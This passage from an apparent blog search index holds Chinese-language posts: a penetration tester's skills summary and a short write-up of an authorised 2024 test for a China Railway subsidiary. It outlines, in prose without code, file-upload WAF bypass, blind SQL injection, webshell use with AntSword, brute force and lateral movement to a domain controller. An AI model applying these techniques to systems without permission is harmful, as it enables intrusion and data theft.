select，增删查改</p><p><strong>我熟练使用SQLmap进行自动化SQL注入检测和利用，用Dirsearch&#x2F;Nmap进行资产发现和目录扫描，用蚁剑管理Webshell</strong></p><p><strong>漏洞研究</strong></p><p>如文件上传欺骗改文件后缀php改成jpg绕过waf，执行恶意代码</p><p><strong>我擅长使用Fiddler、Wireshark、科来网络分析系统进行流量抓包和分析</strong></p><p><strong>‘黑盒测试+白盒审计</strong></p><p>使用nmap扫描ip，开放端口，在线主机，dirsearch收集子域名，用sqlmap，bp对登录接口、用户查询接口、订单查询接口等<strong>敏感功能点</strong>进行手工测试</p><p>**代码审计突破 (白盒)**发现文件上传漏洞，直接引用参数，应该先进行如base64，url编码，或添加死亡die函数，上传whoami等获得管理员信息，弱密码爆破</p><p>、<strong>SQL注入</strong>和<strong>越权访问 是最常见的，通过PHP代码审计发现文件上传漏洞并最终拿到域控权限</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>中铁渗透测试</title>
    <link href="/2024/06/30/%E4%B8%AD%E9%93%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2024/06/30/%E4%B8%AD%E9%93%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>2024.06</p><p><em>很荣幸收到中铁港航东南海洋工程有限公司的邀请，挖掘出15个中危漏洞并获得奖金</em></p><h2 id="项目背景："><a href="#项目背景：" class="headerlink" title="项目背景："></a>项目背景：</h2><p>在该企业实习期间，为集团旗下Web网址及内部网络进行全方位安全评估，防范数据泄露风险。</p><h2 id="技术方案："><a href="#技术方案：" class="headerlink" title="技术方案："></a>技术方案：</h2><p>-采用“黑盒+白盒”测试模式，使用Nmap扫描内网资产，结合BP爆破敏感接口，通过sql布尔盲注发现3处未授权访问漏洞，导致核心用户数据可被遍历。<br>-通过PHP代码审计定位某业务系统文件上传漏洞，利用蚁剑实现服务器权限获取getshell，进一步横向移动发现域控服务器弱口令，最终完成渗透测试报告并推动修复。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
